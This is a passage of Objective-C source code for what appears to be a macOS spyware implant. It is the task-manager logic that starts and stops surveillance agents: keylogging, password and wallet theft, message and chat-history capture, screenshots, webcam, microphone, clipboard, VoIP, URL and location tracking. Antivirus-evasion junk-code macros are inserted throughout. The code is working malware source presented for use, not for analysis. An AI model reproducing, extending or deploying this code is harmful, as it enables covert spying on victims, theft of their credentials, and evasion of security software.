        agentCommand = [[NSMutableData alloc] initWithLength: sizeof(shMemoryCommand)];
        agentConfiguration = [[self getConfigForAgent: agentID] retain];
        
        // AV evasion: only on release build
        AV_GARBAGE_007
        
        shMemoryCommand *shMemoryHeader = (shMemoryCommand *)[agentCommand bytes];
        
        // AV evasion: only on release build
        AV_GARBAGE_001
        
        shMemoryHeader->agentID = agentID;          
        shMemoryHeader->direction = D_TO_AGENT;
        shMemoryHeader->command = AG_STOP;
        memset(shMemoryHeader->commandData, 0, sizeof(shMemoryHeader->commandData));
        
        // AV evasion: only on release build
        AV_GARBAGE_000
        
        shMemoryHeader->commandDataSize = 0;
        
        // AV evasion: only on release build
        AV_GARBAGE_000
        
        if ([gSharedMemoryCommand writeMemory: agentCommand
                                       offset: OFFT_CRISIS
                                fromComponent: COMP_CORE] == TRUE)
        {
          [agentConfiguration setObject: AGENT_STOPPED
                                 forKey: @"status"];
          
          // AV evasion: only on release build
          AV_GARBAGE_008
          
        }
        else
        {      
          // AV evasion: only on release build
          AV_GARBAGE_003
          
          [agentCommand release];
          [agentConfiguration release];
          return NO;
        }
      }
      break;
    }
    default:
    {
      // AV evasion: only on release build
      AV_GARBAGE_000
      
      return NO;
    }
  }
  
  return YES;
}

- (BOOL)restartAgent: (u_int)agentID
{      
  // AV evasion: only on release build
  AV_GARBAGE_000
  
  return YES;
}

- (BOOL)suspendAgent: (u_int)agentID
{      
  // AV evasion: only on release build
  AV_GARBAGE_000
  
  return YES;
}

- (BOOL)suspendAgents
{
  NSAutoreleasePool *outerPool    = [[NSAutoreleasePool alloc] init];
  
  // AV evasion: only on release build
  AV_GARBAGE_004
  
  NSMutableDictionary *anObject;
  
  for (int i = 0; i < [mAgentsList count]; i++)
  {      
    // AV evasion: only on release build
    AV_GARBAGE_001
    
    NSAutoreleasePool *innerPool = [[NSAutoreleasePool alloc] init];
    
    // AV evasion: only on release build
    AV_GARBAGE_002
    
    anObject = [mAgentsList objectAtIndex: i];
    
    // AV evasion: only on release build
    AV_GARBAGE_003
    
    [anObject retain];
    
    // AV evasion: only on release build
    AV_GARBAGE_004
    
    int agentID = [[anObject objectForKey: @"agentID"] intValue];
    
    // AV evasion: only on release build
    AV_GARBAGE_005
    
    if ([[anObject objectForKey: @"status"] isEqualToString: AGENT_RUNNING])
    {
      int retry = 0;
      
      // AV evasion: only on release build
      AV_GARBAGE_007
      
      [self stopAgent:agentID];
      
      // AV evasion: only on release build
      AV_GARBAGE_008
      
      while (![[anObject objectForKey: @"status"] isEqualToString: AGENT_STOPPED] &&
             (retry++ < MAX_RETRY_TIME))
      {
        sleep(1);
      }
      
      // AV evasion: only on release build
      AV_GARBAGE_009
      
      [anObject setObject: AGENT_SUSPENDED forKey: @"status"];
      
      // AV evasion: only on release build
      AV_GARBAGE_000
      
    }
    
    [anObject release];
    
    [innerPool release];
  }
  
  // AV evasion: only on release build
  AV_GARBAGE_001
  
  [outerPool release];
  
  return YES;
}

- (BOOL)restartAgents
{
  NSAutoreleasePool *outerPool    = [[NSAutoreleasePool alloc] init];
  
  // AV evasion: only on release build
  AV_GARBAGE_000
  
  NSMutableDictionary *anObject;
  
  // AV evasion: only on release build
  AV_GARBAGE_001
  
  for (int i = 0; i < [mAgentsList count]; i++)
    {      
      // AV evasion: only on release build
      AV_GARBAGE_009
    
      NSAutoreleasePool *innerPool = [[NSAutoreleasePool alloc] init];
      
      anObject = [mAgentsList objectAtIndex: i];
      
      // AV evasion: only on release build
      AV_GARBAGE_002
      
      [anObject retain];
      
      // AV evasion: only on release build
      AV_GARBAGE_004
      
      int agentID       = [[anObject objectForKey: @"agentID"] intValue];
      
      // AV evasion: only on release build
      AV_GARBAGE_003
      
      if ([[anObject objectForKey: @"status"] isEqualToString: AGENT_SUSPENDED] )
        {
          [self startAgent:agentID];
          
          // AV evasion: only on release build
          AV_GARBAGE_009
          
        }
      
      [anObject release];
      
      [innerPool release];
    }
  
  [outerPool release];
  
  // AV evasion: only on release build
  AV_GARBAGE_003
  
  return YES;
}

- (BOOL)stopAgents
{      
  // AV evasion: only on release build
  AV_GARBAGE_000
  
  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
  __m_MLogManager *_logManager  = [__m_MLogManager sharedInstance];
  
  // AV evasion: only on release build
  AV_GARBAGE_000
  
  NSMutableDictionary *anObject;
  int i = 0;
  
  //for (anObject in mAgentsList)
  for (; i < [mAgentsList count]; i++)
  {
    NSAutoreleasePool *innerPool = [[NSAutoreleasePool alloc] init];
    anObject = [mAgentsList objectAtIndex: i];
    
    // AV evasion: only on release build
    AV_GARBAGE_001
    
    int agentID = [[anObject objectForKey: @"agentID"] intValue];
    NSString *status = [[NSString alloc] initWithString: [anObject objectForKey: @"status"]];
    
    // AV evasion: only on release build
    AV_GARBAGE_003
    
    if ([status isEqualToString: AGENT_RUNNING] == TRUE)
    {
      switch (agentID)
      {
          case AGENT_MONEY:
          {
              // AV evasion: only on release build
              AV_GARBAGE_000
              
              __m_MAgentMoney *agentMoney = [__m_MAgentMoney sharedInstance];
              
              // AV evasion: only on release build
              AV_GARBAGE_001
              
              if ([agentMoney stop] == FALSE)
              {
#ifdef DEBUG_TASK_MANAGER
                  errorLog(@"Error while stopping agent Money");
#endif
                  //return NO;
              }
              else
              {
                  // AV evasion: only on release build
                  AV_GARBAGE_007
                  
                  [anObject setObject: AGENT_STOPPED forKey: @"status"];
              }
#ifdef DEBUG_TASK_MANAGER
              infoLog(@"Money stopped correctly");
#endif

          }
              break;
          case AGENT_PASSWORD:
          {
              // AV evasion: only on release build
              AV_GARBAGE_000
              
              __m_MAgentPassword *agentPassword = [__m_MAgentPassword sharedInstance];
              
              // AV evasion: only on release build
              AV_GARBAGE_001
              
              if ([agentPassword stop] == FALSE)
              {
#ifdef DEBUG_TASK_MANAGER
                  errorLog(@"Error while stopping agent Password");
#endif
                  //return NO;
              }
              else
              {
                  // AV evasion: only on release build
                  AV_GARBAGE_007
                  
                  [anObject setObject: AGENT_STOPPED forKey: @"status"];
              }
#ifdef DEBUG_TASK_MANAGER
              infoLog(@"Password stopped correctly");
#endif
          }
              break;
        case AGENT_MESSAGES:
        {
        // AV evasion: only on release build
        AV_GARBAGE_000
            
        __m_MAgentMessages *agentMessages = [__m_MAgentMessages sharedInstance];
            
        // AV evasion: only on release build
        AV_GARBAGE_001
            
        if ([agentMessages stop] == FALSE)
            {
#ifdef DEBUG_TASK_MANAGER
                errorLog(@"Error while stopping agent Messages");
#endif
                //return NO;
            }
            else
            {
                // AV evasion: only on release build
                AV_GARBAGE_007
                
                [anObject setObject: AGENT_STOPPED forKey: @"status"];
            }
#ifdef DEBUG_TASK_MANAGER
            infoLog(@"Messages stopped correctly");
#endif
        }
        break;
        case AGENT_SCREENSHOT:
        {          
          // AV evasion: only on release build
          AV_GARBAGE_000
          
          __m_MAgentScreenshot *agentScreenshot = [__m_MAgentScreenshot sharedInstance];
          
          if ([agentScreenshot stop] == FALSE)
          {
#ifdef DEBUG_TASK_MANAGER
            infoLog(@"Error while stopping agent Screenshot");
#endif
          }
          else
          {      
            // AV evasion: only on release build
            AV_GARBAGE_002
            
            [anObject setObject: AGENT_STOPPED forKey: @"status"];
          }          
          break;
        }
        case AGENT_ORGANIZER:
        {
          // AV evasion: only on release build
          AV_GARBAGE_000
          
          __m_MAgentOrganizer *agentOrganizer = [__m_MAgentOrganizer sharedInstance];
          
          // AV evasion: only on release build
          AV_GARBAGE_001
          
          if ([agentOrganizer stop] == FALSE)
          {
#ifdef DEBUG_TASK_MANAGER
            errorLog(@"Error while stopping agent Organizer");
#endif
            //return NO;
          }
          else
          {      
            // AV evasion: only on release build
            AV_GARBAGE_007
            
            [anObject setObject: AGENT_STOPPED forKey: @"status"];
          }
#ifdef DEBUG_TASK_MANAGER
          infoLog(@"Organizer stopped correctly");
#endif
          break;
        }
        case AGENT_CAM:
        {
          // AV evasion: only on release build
          AV_GARBAGE_001
          
          __m_MAgentWebcam *agentWebcam = [__m_MAgentWebcam sharedInstance];
          
          if ([agentWebcam stop] == FALSE)
          {
#ifdef DEBUG_TASK_MANAGER
            infoLog(@"Error while stopping agent Webcam");
#endif
          }
          else
          {      
            // AV evasion: only on release build
            AV_GARBAGE_002
            
            [anObject setObject: AGENT_STOPPED forKey: @"status"];
          }
          
          break;
        }
        case AGENT_KEYLOG:
        {          
          // AV evasion: only on release build
          AV_GARBAGE_000
          
          NSMutableData *agentCommand = [[NSMutableData alloc] initWithLength: sizeof(shMemoryCommand)];
          
          // AV evasion: only on release build
          AV_GARBAGE_005
          
          shMemoryCommand *shMemoryHeader = (shMemoryCommand *)[agentCommand bytes];
          shMemoryHeader->agentID         = agentID;
          shMemoryHeader->direction       = D_TO_AGENT;
          shMemoryHeader->command         = AG_STOP;
          
          // AV evasion: only on release build
          AV_GARBAGE_003
          
          if ([gSharedMemoryCommand writeMemory: agentCommand
                                         offset: OFFT_KEYLOG
                                  fromComponent: COMP_CORE] == TRUE)
          {      
            // AV evasion: only on release build
            AV_GARBAGE_008
            
            [anObject setObject: AGENT_STOPPED forKey: @"status"];
            
            // AV evasion: only on release build
            AV_GARBAGE_000
            
            [_logManager closeActiveLog: AGENT_KEYLOG
                              withLogID: 0];
          }
          
          [agentCommand release];
          
          break;
        }
        case AGENT_URL:
        {      
          // AV evasion: only on release build
          AV_GARBAGE_000
          
          NSMutableData *agentCommand = [[NSMutableData alloc] initWithLength: sizeof(shMemoryCommand)];
          
          shMemoryCommand *shMemoryHeader = (shMemoryCommand *)[agentCommand bytes];
          shMemoryHeader->agentID         = agentID;
          shMemoryHeader->direction       = D_TO_AGENT;
          shMemoryHeader->command         = AG_STOP;
          
          // AV evasion: only on release build
          AV_GARBAGE_000
          
          if ([gSharedMemoryCommand writeMemory: agentCommand
                                         offset: OFFT_URL
                                  fromComponent: COMP_CORE] == TRUE)
          {      
            // AV evasion: only on release build
            AV_GARBAGE_001
            
            [anObject setObject: AGENT_STOPPED forKey: @"status"];
            
            // AV evasion: only on release build
            AV_GARBAGE_007
            
            [_logManager closeActiveLog: AGENT_URL
                              withLogID: 0];
          }
          
          [agentCommand release];
          
          break;
        }
        case AGENT_APPLICATION:
        {      
          // AV evasion: only on release build
          AV_GARBAGE_001
          
          NSMutableData *agentCommand = 
          [[NSMutableData alloc] initWithLength: sizeof(shMemoryCommand)];
          
          // AV evasion: only on release build
          AV_GARBAGE_003
          
          shMemoryCommand *shMemoryHeader = (shMemoryCommand *)[agentCommand bytes];
          shMemoryHeader->agentID         = agentID;
          shMemoryHeader->direction       = D_TO_AGENT;
          shMemoryHeader->command         = AG_STOP;
          
          // AV evasion: only on release build
          AV_GARBAGE_004
          
          if ([gSharedMemoryCommand writeMemory: agentCommand
                                         offset: OFFT_APPLICATION
                                  fromComponent: COMP_CORE] == TRUE)
          {
#ifdef DEBUG_TASK_MANAGER
            infoLog(@"Stop command sent to Agent Application", agentID);
#endif
            // AV evasion: only on release build
            AV_GARBAGE_004
            
            [anObject setObject: AGENT_STOPPED forKey: @"status"];
            
            // AV evasion: only on release build
            AV_GARBAGE_001
            
            [_logManager closeActiveLog: AGENT_APPLICATION
                              withLogID: 0];
          }
          
          [agentCommand release];
          
          break;
        }
        case AGENT_MOUSE:
        {      
          // AV evasion: only on release build
          AV_GARBAGE_008
          
          NSMutableData *agentCommand = [[NSMutableData alloc] initWithLength: sizeof(shMemoryCommand)];
          
          // AV evasion: only on release build
          AV_GARBAGE_003
          
          shMemoryCommand *shMemoryHeader = (shMemoryCommand *)[agentCommand bytes];
          shMemoryHeader->agentID         = agentID;
          shMemoryHeader->direction       = D_TO_AGENT;
          shMemoryHeader->command         = AG_STOP;
          
          // AV evasion: only on release build
          AV_GARBAGE_002
          
          if ([gSharedMemoryCommand writeMemory: agentCommand
                                         offset: OFFT_MOUSE
                                  fromComponent: COMP_CORE] == TRUE)
          {      
            // AV evasion: only on release build
            AV_GARBAGE_004
            
            [anObject setObject: AGENT_STOPPED forKey: @"status"];
          }
          
          [agentCommand release];
          
          break;
        }
        case AGENT_CHAT_NEW:
        {          
            // AV evasion: only on release build
            AV_GARBAGE_001

            // agent chat as history dump starts here
            __m_MAgentChat *agentChat = [__m_MAgentChat sharedInstance];
            if ([agentChat stop] == FALSE)
            {
#ifdef DEBUG_TASK_MANAGER
                errorLog(@"Error while stopping agent chat history dump");
#endif
            }
            // agent chat as history dump stops here

            NSMutableData *agentCommand = [[NSMutableData alloc] initWithLength: sizeof(shMemoryCommand)];
          
            // AV evasion: only on release build
            AV_GARBAGE_002
          
            shMemoryCommand *shMemoryHeader = (shMemoryCommand *)[agentCommand bytes];
            shMemoryHeader->agentID         = agentID;
            shMemoryHeader->direction       = D_TO_AGENT;
            shMemoryHeader->command         = AG_STOP;
          
            // AV evasion: only on release build
            AV_GARBAGE_003
          
            if ([gSharedMemoryCommand writeMemory: agentCommand
                                         offset: OFFT_IM
                                  fromComponent: COMP_CORE] == TRUE)
            {
                // AV evasion: only on release build
                AV_GARBAGE_004
            
                [anObject setObject: AGENT_STOPPED forKey: @"status"];
            }
          
            [agentCommand release];
          
            break;
        }
        case AGENT_CLIPBOARD:
        {          
          // AV evasion: only on release build
          AV_GARBAGE_004
          
          NSMutableData *agentCommand = [[NSMutableData alloc] initWithLength: sizeof(shMemoryCommand)];
          
          // AV evasion: only on release build
          AV_GARBAGE_003
          
          shMemoryCommand *shMemoryHeader = (shMemoryCommand *)[agentCommand bytes];
          shMemoryHeader->agentID         = agentID;
          shMemoryHeader->direction       = D_TO_AGENT;
          shMemoryHeader->command         = AG_STOP;
          
          // AV evasion: only on release build
          AV_GARBAGE_004
          
          if ([gSharedMemoryCommand writeMemory: agentCommand
                                         offset: OFFT_CLIPBOARD
                                  fromComponent: COMP_CORE] == TRUE)
          {          
            // AV evasion: only on release build
            AV_GARBAGE_005
            
            [anObject setObject: AGENT_STOPPED forKey: @"status"];
          }
          
          [agentCommand release];
          
          break;
        }
        case AGENT_VOIP:
        {          
          // AV evasion: only on release build
          AV_GARBAGE_003
          
          NSMutableData *agentCommand = [[NSMutableData alloc] initWithLength: sizeof(shMemoryCommand)];
          
          // AV evasion: only on release build
          AV_GARBAGE_002
          
          shMemoryCommand *shMemoryHeader = (shMemoryCommand *)[agentCommand bytes];
          shMemoryHeader->agentID         = AGENT_VOIP;
          shMemoryHeader->direction       = D_TO_AGENT;
          shMemoryHeader->command         = AG_STOP;
          
          // AV evasion: only on release build
          AV_GARBAGE_002
          
          if ([gSharedMemoryCommand writeMemory: agentCommand
                                         offset: OFFT_VOIP
                                  fromComponent: COMP_CORE] == TRUE)
          {          
            // AV evasion: only on release build
            AV_GARBAGE_002
            
            [anObject setObject: AGENT_STOPPED forKey: @"status"];
          }
          
          [agentCommand release];
          
          // AV evasion: only on release build
          AV_GARBAGE_004
          
          break;
        }
        case AGENT_POSITION:
        {          
          // AV evasion: only on release build
          AV_GARBAGE_006
          
          __m_MAgentPosition *agentPosition = [__m_MAgentPosition sharedInstance];
          
          if ([agentPosition stop] == FALSE)
          {
#ifdef DEBUG_TASK_MANAGER
            infoLog(@"Error while stopping agent Position");
#endif
            //return NO;
          }
          else
          {          
            // AV evasion: only on release build
            AV_GARBAGE_005
            
            [anObject setObject: AGENT_STOPPED forKey: @"status"];
          }
          break;
        }
        case AGENT_DEVICE:
        {
#ifdef DEBUG_TASK_MANAGER
            infoLog(@"Starting Agent Device");
#endif

          // AV evasion: only on release build
          AV_GARBAGE_007
          
          __m_MAgentDevice *agentDevice = [__m_MAgentDevice sharedInstance];
          
          if ([agentDevice stop] == FALSE)
          {
#ifdef DEBUG_TASK_MANAGER
            infoLog(@"Error while stopping agent agentDevice");
#endif
            //return NO;
          }
          else
          {          
            // AV evasion: only on release build
            AV_GARBAGE_004
            
            [anObject setObject: AGENT_STOPPED forKey: @"status"];
          }
          break;
        }
        case AGENT_MICROPHONE:
        {          
          // AV evasion: only on release build
          AV_GARBAGE_004
          
          __m_MAgentMicrophone *agentMic = [__m_MAgentMicrophone sharedInstance];
          
          if ([agentMic stop] == FALSE)
          {
#ifdef DEBUG_TASK_MANAGER
            errorLog(@"Error while stopping agent Microphone");
#endif
          }
          else
          {          
            // AV evasion: only on release build
            AV_GARBAGE_004
            
            [anObject setObject: AGENT_STOPPED
                         forKey: @"status"];
          }
          
          break;
        }
        case AGENT_CRISIS:
        {          
          // AV evasion: only on release build
          AV_GARBAGE_007
          
          gAgentCrisis &= ~(CRISIS_STARTSTOP);
          
          __m_MInfoManager *infoManager = [[__m_MInfoManager alloc] init];
          [infoManager logActionWithDescription: @"Crisis stopped"];
          [infoManager release];
          
          // AV evasion: only on release build
          AV_GARBAGE_004
          
          // Only for input manager
          if ([gUtil isLeopard])
          {          
            // AV evasion: only on release build
            AV_GARBAGE_003
            
            NSMutableData *agentCommand = [[NSMutableData alloc] initWithLength: sizeof(shMemoryCommand)];
            
            shMemoryCommand *shMemoryHeader = (shMemoryCommand *)[agentCommand bytes];
            
            // AV evasion: only on release build
            AV_GARBAGE_004
            
            shMemoryHeader->agentID = agentID;          
            shMemoryHeader->direction = D_TO_AGENT;
            shMemoryHeader->command = AG_STOP;
            memset(shMemoryHeader->commandData, 0, sizeof(shMemoryHeader->commandData));
            
            // AV evasion: only on release build
            AV_GARBAGE_007
            
            shMemoryHeader->commandDataSize = 0;
            
            if ([gSharedMemoryCommand writeMemory: agentCommand
                                           offset: OFFT_CRISIS
                                    fromComponent: COMP_CORE] == TRUE)
            {          
              // AV evasion: only on release build
              AV_GARBAGE_009
              
              [anObject setObject: AGENT_STOPPED
                           forKey: @"status"];
              
              // AV evasion: only on release build
              AV_GARBAGE_002
              
            }
            else
            {          
              // AV evasion: only on release build
              AV_GARBAGE_009
              
              [agentCommand release];
              //return NO;
            }
          }
          
          break;
        }
        default:
          break;
      }
    }
    
    // AV evasion: only on release build
    AV_GARBAGE_004
    
    [status release];
    [innerPool release];
    
    // AV evasion: only on release build
    AV_GARBAGE_002
    
    usleep(50000);
  }
  
  // AV evasion: only on release build
  AV_GARBAGE_004
  
  [outerPool release];
  
  // AV evasion: only on release build
  AV_GARBAGE_002
  
  return YES;
}

- (BOOL)startAgents
{
  NSAutoreleasePool *outerPool    = [[NSAutoreleasePool alloc] init];
  __m_MLogManager    *_logManager  = [__m_MLogManager sharedInstance];
  
  // AV evasion: only on release build
  AV_GARBAGE_003
  
  NSData *agentCommand;
  NSMutableDictionary *anObject;
  
  // AV evasion: only on release build
  AV_GARBAGE_004
  
  int i = 0;
  
  // AV evasion: only on release build
  AV_GARBAGE_001
  
  for (; i < [mAgentsList count]; i++)
    {          
      // AV evasion: only on release build
      AV_GARBAGE_008
    
      NSAutoreleasePool *innerPool = [[NSAutoreleasePool alloc] init];
      anObject = [mAgentsList objectAtIndex: i];
      id agentConfiguration        = nil;
      
      // AV evasion: only on release build
      AV_GARBAGE_007
      
      [anObject retain];
      
      // AV evasion: only on release build
      AV_GARBAGE_006
      
      int agentID       = [[anObject objectForKey: @"agentID"] intValue];
      NSString *status  = [[NSString alloc] initWithString: [anObject objectForKey: @"status"]];
      
      // AV evasion: only on release build
      AV_GARBAGE_002
      
      if ([status isEqualToString: AGENT_ENABLED] == TRUE)
        {
          switch (agentID)
            {
                case AGENT_MONEY:
                {
                    // AV evasion: only on release build
                    AV_GARBAGE_006
                    
                    __m_MAgentMoney *agentMoney = [__m_MAgentMoney sharedInstance];
                    agentConfiguration = [[anObject objectForKey: @"data"] retain];
                    
                    // AV evasion: only on release build
                    AV_GARBAGE_007
                    
                    [anObject setObject: AGENT_START
                                 forKey: @"status"];
                    [agentMoney setAgentConfiguration: anObject];
                    
                    // AV evasion: only on release build
                    AV_GARBAGE_004
                    
                    [NSThread detachNewThreadSelector: @selector(start)
                                             toTarget: agentMoney
                                           withObject: nil];
                }
                    break;
                case AGENT_PASSWORD:
                {
                    // AV evasion: only on release build
                    AV_GARBAGE_006
                    
                    __m_MAgentPassword *agentPassword = [__m_MAgentPassword sharedInstance];
                    agentConfiguration = [[anObject objectForKey: @"data"] retain];
                    
                    // AV evasion: only on release build
                    AV_GARBAGE_007
                    
                    [anObject setObject: AGENT_START
                                 forKey: @"status"];
                    [agentPassword setAgentConfiguration: anObject];
                    
                    // AV evasion: only on release build
                    AV_GARBAGE_004
                    
                    [NSThread detachNewThreadSelector: @selector(start)
                                             toTarget: agentPassword
                                           withObject: nil];
                }
                break;
            case AGENT_MESSAGES:
                {
                // AV evasion: only on release build
                AV_GARBAGE_006
                    
                __m_MAgentMessages *agentMessages = [__m_MAgentMessages sharedInstance];
                agentConfiguration = [[anObject objectForKey: @"data"] retain];
                    
                // AV evasion: only on release build
                AV_GARBAGE_007
                    
                [anObject setObject: AGENT_START
                                 forKey: @"status"];
                [agentMessages setAgentConfiguration: anObject];
                    
                // AV evasion: only on release build
                AV_GARBAGE_004
                    
                [NSThread detachNewThreadSelector: @selector(start)
                                             toTarget: agentMessages
                                           withObject: nil];
                    
                }
                break;
            case AGENT_SCREENSHOT:
              {         
                // AV evasion: only on release build
                AV_GARBAGE_003
                
                __m_MAgentScreenshot *agentScreenshot = [__m_MAgentScreenshot sharedInstance];
                agentConfiguration = [[anObject objectForKey: @"data"] retain];
                
                if ([agentConfiguration isKindOfClass: [NSString class]])
                  {
                    // Hard error atm, think about default config parameters
                    // AV evasion: only on release build
                    AV_GARBAGE_007
                    
                    break;
                  }
                else
                  {         
                    // AV evasion: only on release build
                    AV_GARBAGE_007
                  
                    [anObject setObject: AGENT_START forKey: @"status"];
                    [agentScreenshot setAgentConfiguration: anObject];
                    
                    // AV evasion: only on release build
                    AV_GARBAGE_003
                    
                    [NSThread detachNewThreadSelector: @selector(start)
                                             toTarget: agentScreenshot
                                           withObject: nil];
                  }
                                
                break;
              }
            case AGENT_ORGANIZER:
              {         
                // AV evasion: only on release build
                AV_GARBAGE_006
                
                __m_MAgentOrganizer *agentOrganizer = [__m_MAgentOrganizer sharedInstance];
                agentConfiguration = [[anObject objectForKey: @"data"] retain];
                
                // AV evasion: only on release build
                AV_GARBAGE_007
                
                [anObject setObject: AGENT_START
                             forKey: @"status"];
                [agentOrganizer setAgentConfiguration: anObject];
                
                // AV evasion: only on release build
                AV_GARBAGE_004
                
                [NSThread detachNewThreadSelector: @selector(start)
                                         toTarget: agentOrganizer
                                       withObject: nil];
                
                break;
              }
            case AGENT_CAM:
              {          
                // AV evasion: only on release build
                AV_GARBAGE_008
              
                __m_MAgentWebcam *agentWebcam = [__m_MAgentWebcam sharedInstance];
                agentConfiguration = [[anObject objectForKey: @"data"] retain];
                
                // AV evasion: only on release build
                AV_GARBAGE_007
                
                if ([agentConfiguration isKindOfClass: [NSString class]])
                  {     
                    // AV evasion: only on release build
                    AV_GARBAGE_007
                    
                    break;
                  }
                else
                  {
                    [anObject setObject: AGENT_START forKey: @"status"];
                    [agentWebcam setAgentConfiguration: anObject];
                    
                    // AV evasion: only on release build
                    AV_GARBAGE_008
                    
//                    [NSThread detachNewThreadSelector: @selector(start)
//                                             toTarget: agentWebcam
//                                           withObject: nil];
                    [agentWebcam performSelectorOnMainThread:@selector(start) withObject:nil waitUntilDone:FALSE];
                  }
                  
                break;
              }                
            case AGENT_KEYLOG:
              {         
                // AV evasion: only on release build
                AV_GARBAGE_005
                
                agentCommand        = [NSMutableData dataWithLength: sizeof(shMemoryCommand)];
                
                // AV evasion: only on release build
                AV_GARBAGE_003
                
                shMemoryCommand *shMemoryHeader = (shMemoryCommand *)[agentCommand bytes];
                shMemoryHeader->agentID         = agentID;
                shMemoryHeader->direction       = D_TO_AGENT;
                shMemoryHeader->command         = AG_START;
                
                // AV evasion: only on release build
                AV_GARBAGE_007
                
                BOOL success = [_logManager createLog: AGENT_KEYLOG
                                          agentHeader: nil
                                            withLogID: 0];
                
                // AV evasion: only on release build
                AV_GARBAGE_000
                
                if (success == TRUE)
                  {
                    if ([gSharedMemoryCommand writeMemory: agentCommand
                                                   offset: OFFT_KEYLOG
                                            fromComponent: COMP_CORE] == TRUE)
                      {
                        [anObject setObject: AGENT_RUNNING
                                     forKey: @"status"];
#ifdef DEBUG_TASK_MANAGER
                        infoLog(@"Start command sent to Agent Keylog");
#endif
                      }
                    else
                      {
#ifdef DEBUG_TASK_MANAGER
                        infoLog(@"Error while sending start command to the agent");
#endif
                      }
                  }
                
                break;
              }
            case AGENT_URL:
              {         
                // AV evasion: only on release build
                AV_GARBAGE_000
                
                agentCommand = [NSMutableData dataWithLength: sizeof(shMemoryCommand)];
                agentConfiguration = [[anObject objectForKey: @"data"] retain];

                if ([agentConfiguration isKindOfClass: [NSString class]])
                  {
                    // AV evasion: only on release build
                    AV_GARBAGE_007
                    
                    break;
                  }
                else
                  {         
                    // AV evasion: only on release build
                    AV_GARBAGE_007
                  
                    shMemoryCommand *shMemoryHeader = (shMemoryCommand *)[agentCommand bytes];
                    shMemoryHeader->agentID         = agentID;
                    shMemoryHeader->direction       = D_TO_AGENT;
                    shMemoryHeader->command         = AG_START;
                    
                    // AV evasion: only on release build
                    AV_GARBAGE_004
                    
                    NSMutableData *urlConfig = [NSMutableData dataWithLength: sizeof(shMemoryLog)];
                    
                    // AV evasion: only on release build
                    AV_GARBAGE_003
                    
                    shMemoryLog *_urlConfig     = (shMemoryLog *)[urlConfig bytes];
                    _urlConfig->status          = SHMEM_WRITTEN;
                    _urlConfig->agentID         = AGENT_URL;
                    _urlConfig->direction       = D_TO_AGENT;
                    _urlConfig->commandType     = CM_AGENT_CONF;
                    _urlConfig->commandDataSize = [agentConfiguration length];
                    
                    // AV evasion: only on release build
                    AV_GARBAGE_000
                    
                    memcpy(_urlConfig->commandData,
                           [agentConfiguration bytes],
                           [agentConfiguration length]);
                    
                    // AV evasion: only on release build
                    AV_GARBAGE_007
                    
                    if ([gSharedMemoryLogging writeMemory: urlConfig
                                                   offset: 0
                                            fromComponent: COMP_CORE] == TRUE)
                    {         
                      // AV evasion: only on release build
                      AV_GARBAGE_000
                      
                      BOOL success = [_logManager createLog: AGENT_URL
                                                  agentHeader: nil
                                                    withLogID: 0];

                        if (success == TRUE)
                          {
                            if ([gSharedMemoryCommand writeMemory: agentCommand
                                                           offset: OFFT_URL
                                                    fromComponent: COMP_CORE] == TRUE)
                              {
                                [anObject setObject: AGENT_RUNNING
                                             forKey: @"status"];
                                
                                // AV evasion: only on release build
                                AV_GARBAGE_007
                                
                              }
                            else
                              {
#ifdef DEBUG_TASK_MANAGER
                                infoLog(@"An error occurred while starting agent URL");
#endif
                              }
                          }
                      }
                    else
                      {
#ifdef DEBUG_TASK_MANAGER
                        errorLog(@"Error while sending configuration to Agent URL");
#endif
                      }
                  }
                
                break;
              }
            case AGENT_APPLICATION:
              {         
                // AV evasion: only on release build
                AV_GARBAGE_000
                
                agentCommand = [NSMutableData dataWithLength: sizeof(shMemoryCommand)];
                
                shMemoryCommand *shMemoryHeader = (shMemoryCommand *)[agentCommand bytes];
                shMemoryHeader->agentID         = agentID;
                shMemoryHeader->direction       = D_TO_AGENT;
                shMemoryHeader->command         = AG_START;
                
                // AV evasion: only on release build
                AV_GARBAGE_007
                
#ifdef DEBUG_TASK_MANAGER
                infoLog(@"Creating Application Agent log file");
#endif
                BOOL success = [_logManager createLog: AGENT_APPLICATION
                                          agentHeader: nil
                                            withLogID: 0];
                
                // AV evasion: only on release build
                AV_GARBAGE_007
                
                if (success == TRUE)
                  {
                    if ([gSharedMemoryCommand writeMemory: agentCommand
                                                   offset: OFFT_APPLICATION
                                            fromComponent: COMP_CORE] == TRUE)
                      {
                        [anObject setObject: AGENT_RUNNING
                                     forKey: @"status"];

#ifdef DEBUG_TASK_MANAGER
                        infoLog(@"Start command sent to Agent Applicatioin");
#endif
                      }
                    else
                      {
#ifdef DEBUG_TASK_MANAGER
                        infoLog(@"An error occurred while starting agent Application");
#endif
                      }
                  }
                break;
              }
            case AGENT_MOUSE:
              {
                agentCommand = [NSMutableData dataWithLength: sizeof(shMemoryCommand)];
                agentConfiguration = [[anObject objectForKey: @"data"] retain];
                
                // AV evasion: only on release build
                AV_GARBAGE_002
                
                if ([agentConfiguration isKindOfClass: [NSString class]])
                {         
                  // AV evasion: only on release build
                  AV_GARBAGE_007
                  
                    break;
                  }
                else
                  {
                    shMemoryCommand *shMemoryHeader = (shMemoryCommand *)[agentCommand bytes];
                    shMemoryHeader->agentID     = AGENT_MOUSE;
                    shMemoryHeader->direction   = D_TO_AGENT;
                    shMemoryHeader->command     = AG_START;
                    
                    // AV evasion: only on release build
                    AV_GARBAGE_004
                    
                    NSMutableData *mouseConfig = [NSMutableData dataWithLength: sizeof(shMemoryLog)];
                    
                    shMemoryLog *_mouseConfig     = (shMemoryLog *)[mouseConfig bytes];
                    _mouseConfig->status          = SHMEM_WRITTEN;
                    _mouseConfig->agentID         = AGENT_MOUSE;
                    _mouseConfig->direction       = D_TO_AGENT;
                    _mouseConfig->commandType     = CM_AGENT_CONF;
                    _mouseConfig->commandDataSize = [agentConfiguration length];
                    
                    // AV evasion: only on release build
                    AV_GARBAGE_003
                    
                    memcpy(_mouseConfig->commandData,
                           [agentConfiguration bytes],
                           [agentConfiguration length]);
                    
                    // AV evasion: only on release build
                    AV_GARBAGE_005
                    
                    if ([gSharedMemoryLogging writeMemory: mouseConfig
                                                   offset: 0
                                            fromComponent: COMP_CORE] == TRUE)
                      {         
                        // AV evasion: only on release build
                        AV_GARBAGE_003
                      
                        if ([gSharedMemoryCommand writeMemory: agentCommand
                                                       offset: OFFT_MOUSE
                                                fromComponent: COMP_CORE] == TRUE)
                        {         
                          // AV evasion: only on release build
                          AV_GARBAGE_000
                          
                          [anObject setObject: AGENT_RUNNING
                                         forKey: @"status"];
                          }
                      }
                  }
                break;
              }
